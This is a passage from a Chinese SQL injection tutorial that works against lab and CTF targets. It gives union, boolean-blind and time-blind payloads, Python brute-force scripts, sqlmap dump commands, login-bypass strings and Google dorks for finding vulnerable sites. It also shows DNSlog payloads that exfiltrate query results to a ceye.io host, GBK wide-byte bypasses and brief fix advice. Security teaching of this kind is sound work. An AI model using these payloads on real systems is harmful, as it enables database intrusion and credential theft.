【admin:mysql】\n-1 union select 1,group_concat(user_name),group_concat(user_pass) from admin\n-1 union select 1,user_name,user_pass from admin \n```\n我们又快速的实现了一次手工注入，但是你有没和我一样的感觉，太麻烦了，有更方便的方法吗，emm...\n\n当然有啦，使用SqlMap工具可以快速实现注入👇\n\n## 四、使用SqlMap注入\n\n具体使用方法请问我之前写的文章👉[sqlmap使用方法](https://www.jianshu.com/p/a46abd1e67aa)\n\n#### SqlMap初体验\n\n接着使用上面靶机进行测试\n\n```bash\n#查询数据库 #【test】\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 --dbs\n\n#获取数据库中的表 #【admin、news】\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test --tables\n\n#获取表中的字段名 #【 user_id、user_name、user_pass】\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin --columns\n\n#获取字段信息 【admin:mysql】\npython sqlmap.py -u http://139.224.112.182:8801/search.php?id=1 -D test -T admin -C user_name,user_pass --dump\n```\n\n#### 一道CTF题目\n\n题目：简单的sql注入2\n\n地址：http://139.224.112.182:8087/ctf_collect\n\n解析：https://www.jianshu.com/p/1aeedef99f21\n\n**1**.查询当前数据库(空格被过滤可以使用tamper脚本中space2comment)\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dbs \n```\n\n![](https://i.loli.net/2020/05/04/duk1Pzgn8vseYVw.png)\n发现web1数据库\n**2**.查询数据库中的表\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment -D web1 --tables\n```\n\n![](https://i.loli.net/2020/05/04/VqgauHCbZ7SIFYL.png)\n发现flag表\n**3**.查询flag表中字段名\n\n````bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --columns -T flag -D web1\n````\n\n![](https://i.loli.net/2020/05/04/DvPQ6OponqHuCZz.png)\n发现flag字段\n**4**.查询字段flag信息\n\n```bash\npython sqlmap.py -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper=space2comment --dump -C flag -T flag -D web1\n```\n<img src=\"https://i.loli.net/2020/05/04/TfZAoObdMPiLJIt.png\" style=\"zoom: 80%;\" />\n\n## 五、发现注入点\n\n### 1 使用漏洞扫描工具\n\n工具：OWASP ZAP、D盾、Seay\n\n万能密码：\n\n```sql\n1' or 1=1 # 用户名和密码都可  \n' or '1'='1' -- \n\n1' or '1'='1 密码才可\n```\n\n### 2 通过Google Hacking 寻找SQL注入\n\n> 看到这里我们已经完成了一次最基础的GET字符型Sql注入，有人可能会问了，这是自己搭建的靶机，知道是存在sql注入，真实环境中如何去发现Sql注入呢\n\n```\ninurl:php?id=\ninurl:.asp?id=\ninurl:index.php?id=\ninurl:showproduct.asp?id=\nsite:http://139.224.112.182:8802/ inurl:php?id\nsite:https://jwt1399.top inurl:.html\n......\n```\n\n服务器报错，并把错误信息返回到网页上面。根据错误信息，判断这里大概率存在注入点。\n\n## 六、 修复建议\n\n1. 过滤用户输入的数据。默认情况下，应当认为用户的所有输入都是不安全的。\n2. 对于整数，判断变量是否符合[0-9]的值；其他限定值，也可以进行合法性校验；\n3. 对于字符串，对SQL语句特殊字符进行转义(单引号转成两个单引号，双引号转成两个双引号)。\n4. 绑定变量，使用预编译语句\n\n# 进阶篇\n\n## 一、SQL注入基础知识\n\n> 不要急于进行SQL注入，请先看完这部分，很重要！，很重要！，很重要！\n\n**1.基本的SQL语句查询源码**\n\n```sql\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n# LIMIT [偏移量],行数\n```\n\n通常情况下联合查询(union)时需要将前面的查询结果限定为空集，后面的查询结果才能显示出来。例如id值设为负数或0，因为带有`LIMIT 0,1`则只能显示一条数据\n\n```sql\n?id=-1 union select 1,2,3\n?id=0  union select 1,2,3\n?id=-1' union select 1,2,group_concat(username,password) from users\n```\n\n**2.MySQL数据库几种注释**\n\n|                注释符                 | 描述                                                         |\n| :-----------------------------------: | ------------------------------------------------------------ |\n| ` #                                 ` | 单行注释  URL编码 `%23`，在URL框直接使用中`#`号必须用`%23`来表示，#在URL框中有特定含义，代表锚点 |\n|          `--空格           `          | 单行注释 ，实际使用中`--空格`用`--+`来表示。因为在URL框中，浏览器在发送请求的时候会把URL末尾的空格舍去，所以用`--+`代替`--空格` |\n|                `/* */`                | 块注释                                                       |\n|               `/*! */`                | 内联注释                                                     |\n\n**3.数据库相关--Information_schema库**\n\n- `information_schema`，系统数据库，包含所有数据库相关信息。\n- `information_schema.schemata`中`schema_name`列，字段为所有数据库名称。\n- `information_schema.tables`中`table_name`列对应数据库所有表名\n- `information_schema.columns`中，`column_name`列对应所有列名\n\n#### **4.连接字符串函数**\n\n[concat(),concat_ws()与及group_concat()的用法](https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc)\n\n- `concat(str1,str2,…)`——没有分隔符地连接字符串\n\n- `concat_ws(separator,str1,str2,…)`——含有分隔符地连接字符串\n\n- `group_concat(str1,str2,…)`——连接一个组的所有字符串，并以逗号分隔每一条数据，知道这三个函数能一次性查出所有信息就行了。\n\n**6.MySQL常用的系统函数**\n\n```mysql\nversion()            #MySQL版本\nuser()               #数据库用户名\ndatabase()           #数据库名\n@@basedir            #数据库安装路径\n@@datadir            #数据库文件存放路径\n@@version_compile_os #操作系统版本\n```\n**7.MySQL函数**\n\n```sql\ncount(*)：返回匹配指定条件的行数。\nrand()：返回0~1间的小数\nfloor()：把小数向下取整\ngroup by语句：把结果分组输出\n```\n\n**8.[sql注入之你问我答]( https://www.cnblogs.com/xishaonian/p/6036909.html)**\n\n## 二、盲注\n\n> SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。\n\n### 基础知识\n\n#### 手工盲注思路\n\n手工盲注的过程，就像你与一个机器人聊天，\n这个机器人知道的很多，但只会回答“`是`”或者“`不是`”，\n因此你需要询问它这样的问题，例如“`数据库名字的第一个字母是不是a啊？`”\n通过这种机械的询问，最终获得你想要的数据。\n\n#### 手工盲注的步骤\n\n1.判断是否存在注入，注入是字符型还是数字型 \n2.猜解当前数据库名 \n3.猜解数据库中的表名\n4.猜解表中的字段名 \n5.猜解数据\n\n#### 盲注常用函数\n\n| 函数                            | 描述                                                         |\n| ------------------------------- | ------------------------------------------------------------ |\n| left(字符串，截取长度)          | 从左边截取指定长度的字符串                                   |\n| length(字符串)                  | 获取字符串的长度                                             |\n| ascii(字符串)                   | 将指定字符串进行ascii编码                                    |\n| substr(字符串，start，截取长度) | 截取字符串，可以指定起始位置和长度                           |\n| mid(字符串，start，截取长度)    | 截取字符串，可以指定起始位置和长度                           |\n| count()                         | 计算总数，返回匹配条件的行数。                               |\n| sleep(n)                        | 将程序挂起n秒                                                |\n| if(参数1，参数2，参数3)         | 参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3 |\n\n### 布尔盲注\n\n#### **布尔注入利用情景**\n\n- 页面上没有显示位，并且没有输出SQL语句执行错误信息\n- 只能通过页面返回正常与不正常判断\n\n#### 手工实现布尔盲注\n\n靶机：sqli-labs第5关\n\n##### 1 .查看页面变化，判断sql注入类别\n\n```sql\n?id=1 and 1=1\n?id=1 and 1=2\n【字符型】\n```\n\n##### 2.猜解数据库长度\n\n使用length()判断数据库长度，二分法可提高效率\n\n```sql\n?id=1' and length(database())>5 --+\n?id=1' and length(database())<10 --+\n?id=1' and length(database())=8 --+\n【length=8】\n```\n\n##### 3.猜当前数据库名\n\n###### 方法1：使用`substr函数`\n\n```sql\n?id=1' and substr(database(),1,1)>'r'--+\n?id=1' and substr(database(),1,1)<'t'--+\n?id=1' and substr(database(),1,1)='s'--+\n?id=1' and substr(database(),2,1)='e'--+\n...\n?id=1' and substr(database(),8,1)='y'--+\n【security】\n```\n\n###### 方法2：使用`ascii函数和substr函数`\n\n```sql\n?id=1' and ascii(substr(database(),1,1))>114 --+\n?id=1' and ascii(substr(database(),1,1))<116 --+\n?id=1' and ascii(substr(database(),1,1))=115 --+\n【security】\n```\n\n![ASCill表](https://i.loli.net/2020/05/15/Pqd31eKrgQbzCfL.png)\n\n###### 方法3：使用`left函数`\n\n```sql\n?id=1' and left(database(),1)>'r'--+\n?id=1' and left(database(),1)<'t'--+\n?id=1' and left(database(),1)='s' --+\n?id=1' and left(database(),2)='se' --+\n?id=1' and left(database(),3)='sec' --+\n...\n?id=1' and left(database(),8)='security' --+\n【security】\n```\n\n###### 方法4：使用`Burpsuite的Intruder模块`\n\n将获取数据库第一个字符的请求包拦截并发送到Intruder模块\n\n设置攻击变量以及攻击类型\n\n![](https://i.loli.net/2020/05/15/k9ZnQNwtxCaPFEK.png)\n\n设置第一个攻击变量，这个变量是控制第几个字符的\n\n![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)\n\n设置第二个攻击变量，这个变量是数据库名字符\n\n![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)\n\n开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到\n\n![](https://i.loli.net/2020/05/15/zixp5ct3E82unDX.png)\n\n\n\n##### 4.判断表的个数\n\ncount()函数是用来统计表中记录的一个函数，返回匹配条件的行数。\n\n```sql\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>0 --+\n?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+\n【4个表】\n```\n\n##### 5.判断表的长度\n\nlimit可以被用于强制select语句返回指定的条数。\n\n```sql\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+\n【第一个表长度为6】\n\n?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+\n【第二个表长度为8】\n```\n\n##### 6.猜解表名\n\n###### 方法1：使用`substr函数`\n\n```sql\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'d' --+\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>'f' --+\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+\n...\n?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' --+\n【第一个表名为emails】\n```\n\n###### 方法2：使用`Burpsuite的Intruder模块`\n\n使用方法跟上方获得数据库名一样，就不赘述了\n\n![](https://i.loli.net/2020/05/15/4O3Hv2Iekq7tSzw.png)\n\n![](https://i.loli.net/2020/05/15/bdvhEPFcnsYTwQJ.png)\n\n##### 7.猜解字段名和字段信息\n\n```sql\n#确定字段个数\n?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')>0 --+\n?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+\n【字段个数为3】\n\n#确定字段名的长度\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))>0 --+\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+\n?id=1' and length((select  column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+\n【第一个字段长度为2，第二个字段长度为8】\n\n#猜字段名 同上使用burp\n?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i'  --+\n【...id,username,password...】\n\n#确定字段数据长度\n?id=1' and length((select username from users limit 0,1))=4  --+\n【第一个字段数据长度为4】\n\n#猜解字段数据 同上使用burp\n?id=1' and substr((select username from users limit 0,1),1,1)='d'  --+\n\n?id=1' and ascii(substr((select username from users limit 0,1),1,1))>79  --+\n【第一个username数据为dumb】\n```\n\n#### SqlMap实现布尔盲注\n\n```\n--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。\n--technique:选择注入技术，B:Boolean-based-blind  （布尔型盲注）\n--threads 10 :设置线程为10，运行速度会更快\n```\n\n```bash\n#查询数据库 #【security】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10\n\n#获取数据库中的表 #【emails、referers、uagents、users】\npython sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security  --tables --batch --threads 10\n\n#获取表中的字段名 #【id、username、password】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10\n\n#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10\n```\n\n####  脚本实现布尔盲注\n\n##### 1.获取数据库名长度\n\n  ```python\n# coding:utf-8\nimport requests\n\n# 获取数据库名长度\ndef database_len():\n    for i in range(1, 10):\n        url = '''http://139.224.112.182:8087/sqli1/Less-5/'''\n        payload = '''?id=1' and length(database())=%d''' %i\n        r = requests.get(url + payload + '%23') # %23 <==> --+\n        if 'You are in' in r.text:\n            print('database_length:', i)\n            break\n        else:\n            print(i)\n\ndatabase_len()\n# 【database_length: 8】\n  ```\n\n##### 2.获取数据库名\n\n```python\n# coding:utf-8\nimport requests\n#获取数据库名\ndef database_name():\n    name = ''\n    for j in range(1,9):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = \"?id=1' and substr(database(),%d,1)='%s' --+\"  %(j, i) \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('database_name:', name)\n\ndatabase_name()\n# 【database_name: security】\n```\n\n##### 3.获取数据库中表\n\n```python\n# coding:utf-8\nimport requests\n# 获取数据库表\ndef tables_name():\n    name = ''\n    for j in range(1, 30):\n        for i in 'abcdefghijklmnopqrstuvwxyz,':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = '''?id=1' and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s' --+''' % (j, i)\n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('table_name:', name)\n\ntables_name()\n\n#【table_name: emails,referers,uagents,users】\n```\n\n##### 4.获取表中字段\n\n```python\n# coding:utf-8\nimport requests\n\n# 获取表中字段\ndef columns_name():\n    name = ''\n    for j in range(1, 30):\n        for i in 'abcdefghijklmnopqrstuvwxyz,':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"    \n            payload = \"?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),%d,1)='%s' --+\" %(j, i)        \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('column_name:', name)\n\ncolumns_name()\n#【column_name: id,username,password】\n```\n\n##### 5.获取字段值\n\n```python\n# coding:utf-8\nimport requests\n# 获取字段值\ndef value():\n    name = ''\n    for j in range(1, 100):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyz,_-':\n            url = \"http://139.224.112.182:8087/sqli1/Less-5/\"  \n            payload = \"?id=1' and substr((select group_concat(username,password) from users),%d,1)='%s' --+\" %(j, i)    \n            r = requests.get(url + payload)\n            if 'You are in' in r.text:\n                name = name + i\n                print(name)\n                break\n    print('value:', name)\n\nvalue()\n```\n\n### 时间盲注\n\n#### 时间注入利用情景\n\n- 页面上没有显示位\n- 没有输出报错语句\n- 正确的sql语句和错误的sql语句页面返回一致\n\n#### 手工实现时间盲注\n\n靶机：sqli-labs第9关\n\n```sql\n?id=1 \n?id=1'\n?id=1\"\n#不管怎么样都不报错，不管对错一直显示一个固定的页面；\n\n#判断注入点\n?id=1' and sleep(3)--+\n#页面响应延迟，判断存在时间延迟型注入\n\n#获取数据库名长度\n?id=1' and if(length(database())=8,sleep(3),1)--+\n\n#获取数据库名\n?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+\n```\n\n**结合`Burpsuite的Intruder模块`爆破数据库名**\n\n将获取数据库第一个字符的请求包拦截并发送到Intruder模块\n\n设置攻击变量以及攻击类型\n\n![](https://i.loli.net/2020/05/15/cYjrQ6ygw3TxJGS.png)设置第一个攻击变量，这个变量是控制第几个字符的\n\n![](https://i.loli.net/2020/05/15/Q9VEkKqtIJOcPdh.png)\n\n设置第二个攻击变量，这个变量是数据库名字符\n\n![](https://i.loli.net/2020/05/15/Ruzc9a1JPyVfKq3.png)\n\n开始攻击，一小会就能得到测试结果，通过对长度和变量进行排序可以看到数据库名成功得到\n\n![image-20200515211534056](https://i.loli.net/2020/05/15/izwlJ71SsEYByIO.png)\n\n\n\n**获取表名、字段名、字段信息等数据方法同上，就不赘述了**\n\n#### SQLmap实现时间盲注\n\n```\n--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。\n--technique:选择注入技术，-T:Time-based blind  （基于时间延迟注入）\n--threads 10 :设置线程为10，运行速度会更快。\n```\n\n```bash\n#查询数据库 #【security】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T --dbs --batch --threads 10\n\n#获取数据库中的表 #【emails、referers、uagents、users】\npython sqlmap.py  -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security  --tables --batch --threads 10\n\n#获取表中的字段名 #【id、username、password】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users --columns --batch --threads 10 \n\n#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】\npython sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-9/?id=1 --technique T -D security -T users -C username,password --dump --batch --threads 10 \n\n```\n\n#### 脚本实现时间盲注\n\n##### 1.获取数据库名长度\n\n```python\n# coding:utf-8\nimport requests\nimport datetime\n\n# 获取数据库名长度\ndef database_len():\n    for i in range(1, 10):\n        url = '''http://139.224.112.182:8087/sqli1/Less-9/'''\n        payload = '''?id=1' and if(length(database())=%d,sleep(3),1)--+''' %i\n        time1 = datetime.datetime.now()\n        r = requests.get(url + payload)\n        time2 = datetime.datetime.now()\n        sec = (time2 - time1).seconds\n        if sec >= 3:\n            print('database_len:', i)\n            break\n        else:\n            print(i)\n            \ndatabase_len()\n```\n\n##### 2.获取数据库名\n\n```python\n# coding:utf-8\nimport requests\nimport datetime\n\n#获取数据库名\ndef database_name():\n    name = ''\n    for j in range(1, 9):\n        for i in '0123456789abcdefghijklmnopqrstuvwxyz_':\n            url = '''http://139.224.112.182:8087/sqli1/Less-9/'''\n            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(1),1) --+''' % (j,i)\n            time1 = datetime.datetime.now()\n            r = requests.get(url + payload)\n            time2 = datetime.datetime.now()\n            sec = (time2 - time1).seconds\n            if sec >= 1:\n                name = name + i\n                print(name)\n                break\n    print('database_name:', name)\n\ndatabase_name()\n```\n\n**获取表名、字段名、字段信息等数据的脚本类似上面布尔盲注脚本，就不赘述了**\n## 三、DNSlog盲注\n\n### 基础知识\n\n#### 什么是DNS\n\nDNS的全称是 `Domain Name System`（域名系统），它将域名解析为 IP，使人更方便地访问互联网。当用户输入某一网址如`www.baidu.com`，网络上的 DNS 服务器会将该域名解析，并找到对应的真实IP：`182.61.200.6`，使用户可以访问这台服务器上相应的服务。\n\n#### 什么是DNSlog\n\nDNSlog 就是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。SQL 盲注、命令执行、SSRF 及 XSS 等攻击而无法看到回显结果时，就会用到 DNSlog 技术。\n\n#### 为什么用Dnslog盲注\n\n对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，最后导致 IP 被 ban，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入。\n\n### 原理\n\n**Mysql攻击语句:**\n\n```sql\nselect load_file(concat('\\\\\\\\',攻击语句,'.XXX.ceye.io\\\\abc'))\n```\n\n**利用DNSlog的前提条件：**\n\n- 1.支持`load_file()`函数，通过执行 `show variables like '%secure%';` 查看  `load_file()` 是否可以读取文件。\t\n\n  - 当secure_file_priv为空，就可以读取磁盘的目录。\n  - 当secure_file_priv为G:\\，就可以读取G盘的文件。\n  - 当secure_file_priv为null，load_file就不能加载文件。\n  - 通过设置my.ini来配置。secure_file_priv=\"\"就是可以load_flie任意磁盘的文件。\n- 2.DNSlog平台\n\n  - http://ceye.io\n  - http://www.dnslog.cn\n  - http://admin.dnslog.link\n\n  - https://github.com/bugscanteam/dnslog/\n- Window平台，Linux平台不支持。这个技术本质是利用 UNC 发起的 DNS 查询，因为 Linux 没有 UNC 路径，所以当处于 Linux 系统时，不能使用该方式获取数据，而且 UNC 的路径不能超过 128，否则会失败。当我们在使用 UNC 路径时，是会对域名进行 DNS 查询。\n\n**UNC路径:**\n\n> UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。\n\n其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式\n\n```\n\\\\192.168.1.132\\test\\\n```\n\n这也就解释了为什么`CONCAT()`函数拼接了4个`\\`了，因为转义的原因，4个`\\`就变成了2个`\\`，后面的`\\\\abc`变成了`\\abc`，目的就是利用UNC路径。\n\n因为 Linux 没有 UNC 路径这个东西，所以当 MySQL 处于 Linux 系统中的时候，是不能使用这种方式外带数据的。\n\n| 原理图                                               | 原理图                                               |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200806155150.jpg) | ![](https://img.jwt1399.top//img/20200806155100.png) |\n\n如图所示，作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。\n\n **详细解释：**\n\n1、攻击者提交注入语句`select load_file(concat('\\\\\\\\','攻击语句',.XXX.ceye.io\\\\abc))`\n\n2、Web服务器将语句传递给数据库，在数据库中攻击语句被执行\n\n3、`concat`函数将执行结果与`XXX.ceye.io\\\\abc`拼接，构成`\\\\root.XXX.ceye.io\\abc`，而 `mysql` 中的 `select load_file()`可以发起 DNS 请求\n\n4、那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析;\n\n5、此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的`ceye.io`，这其实是一个开放的DNSlog平台，在上面我们可以获取到有关`ceye.io`的DNS查询信息。\n\n6、当它发现域名中存在`ceye.io`时，它会将这条域名信息转到相应的[NS服务器](https://baike.baidu.com/item/NS/2907719?fr=aladdin)上，而通过[http://ceye.io](http://ceye.io/)我们就可以查询到这条DNS解析记录。\n\n###  实例\n\n#### **DVWA-SQL盲注**\n\n##### **查询数据库**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806181940.png)\n\n##### **查询表**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182142.png)\n\n##### **查询列**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select column_name from information_schema.columns where table_name='users' limit 4,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182629.png)\n\n##### **查询值**\n\n```sql\n1' and if((select load_file(concat('\\\\\\\\',(select password from users limit 0,1),'.xxxx.ceye.io\\\\sql_test'))),1,0)#\n```\n\n![](https://img.jwt1399.top//img/20200806182944.png)\n\n**参考：**\n\n- [手把手带你利用SQLmap结合OOB技术实现音速盲注](https://www.freebuf.com/sectool/222967.html)\n- [巧用DNSlog实现无回显注入](https://www.cnblogs.com/afanti/p/8047530.html)\n\n## 四、宽字节注入\n\n### 原理\n\n> 宽字节注入是利用mysql的一个特性，`mysql在使用GBK编码的时候，会认为两个字符是一个汉字`【前一个ascii码要大于`128`，才到汉字的范围】\n\n在PHP配置文件中`magic_quotes_gpc=On`或者使用`addslashes`函数，`icov`函数,`mysql_real_escape_string`函数、`mysql_escape_string`函数等，提交的参数中如果带有单引号`'`，就会被自动转义`\\'`，这样就使得多数注入攻击无效。\n\n当输入单引号，假设这里我们使用`addslashes`转义，对应的url编码是：\n**`'` -->`\\'`--> `%5c%27`**\n当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：\n**`%df'` --> `%df\\'` --> `(%df%5C)%27`-->`(数据库GBK)`-->`運'`**\n\n| %5c%27                                               | %df%5C%27                                            |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200608094626.png) | ![](https://img.jwt1399.top//img/20200608094630.png) |\n\n前端输入**`%df'`**时首先经过上面**`addslashes`**函数和浏览器**`url编码`**转义变成了**`%df%5c%27`**\n\n因为数据库使用`GBK`编码的话，**%df%5c会被当作一个汉字处理,转换成了汉字\"運\"**，从而使`%27`（单引号）逃出生天，成功绕过,利用这个特性从而可实施SQL注入的利用。\n\n[在线GBK汉字编码字符集对照表](http://www.jsons.cn/gbkcode)\n\n### 实例\n\n**题目来源：CG-CTF---GBK Injection**\n\n#### 手工注入\n\n题目地址：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\n\n```sql\n?id=1\n'''\nyour sql:select id,title from news where id = '1'\nhere is the information\n'''\n```\n输入`1'`可以看到`'`被变成了`\\'`,应该是`addslashes`之类的函数转义的结果。\n```sql\n?id=1'\n'''\nyour sql:select id,title from news where id = '1\\''\nhere is the information    \n'''\n```\n\n用上文宽字节构造方法，构造id=1%df'或者id=1%aa'，成功报错\n\n```sql\n?id=1%df'\n或者【只要ASCII大于128的字符就可以】\n?id=1%aa'\n'''\nyour sql:select id,title from news where id = '1ß\\''\nWarning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10\n'''\n```\n\n**确定字段数**\n\n```sql\n?id=1%aa' order by 1 --+\t正常\n?id=1%aa' order by 2 --+\t正常\n?id=1%aa' order by 3 --+\t报错\n'''\n所以字段数为2\n'''\n```\n\n**确定显示位**\n\n前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来\n\n```sql\n?id=-1%aa' union select 1,2  --+\n'''\nyour sql:select id,title from news where id = '-1歿'union select 1,2 -- '\n2\n'''\n```\n\n确定了回显的位置是2\n\n**查询信息**\n\n```objectivec\n#查询数据库\n?id=-1%aa' union select 1,database()  --+\n'''\nsae-chinalover\n'''\n    \n#查询表名\n?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+\n'''\nctf,ctf2,ctf3,ctf4,news\n'''  \n    \n#查询字段名\n?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+\n\n'''这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。\nid,flag\n'''\n#查询字段信息\n?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+\n'''\n1:flag{this_is_sqli_flag}\n'''\n    \n?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     \n'''\nh4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    \n'''    \n```\n\n有2个flag，成功得到flag\n\n#### **使用sqlmap**\n**方法一：**普通方法,根据提示选择选项\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\"\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" --dbs\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover  --tables\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover  -T --columns\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df'\" -D sae-chinalover -T ctf4 -C flag --dump\n\n\n```\n\n**方法二：**使用脚本：`unmagicquotes.py`【作用：宽字符绕过】\n\n```sql\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --tamper unmagicquotes --dbs\n'''\navailable databases [2]:                                                                       [*] information_schema\n[*] sae-chinalover\n'''\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1\" --tamper unmagicquotes -D sae-chinalover --tables\n'''\nDatabase: sae-chinalover\n[6 tables]\n+---------+\n| ctf     |\n| ctf2    |\n| ctf3    |\n| ctf4    |\n| gbksqli |\n| news    |\n+---------+\n'''\n\nsqlmap -u \"http://chinalover.sinaapp.com/SQL-GBK/index.php?id=3\" --tamper unmagicquotes -D sae-chinalover -T ctf4 --columns\n'''\nDatabase: sae-chinalover                                                                                                   \nTable: ctf4\n[2 columns]\n+--------+--------------+\n| Column | Type         |\n+--------+--------------+\n| flag   | varchar(100) |\n| id     | int(10)      |\n+--------+--------------+\n'''\n\nsqlmap -u 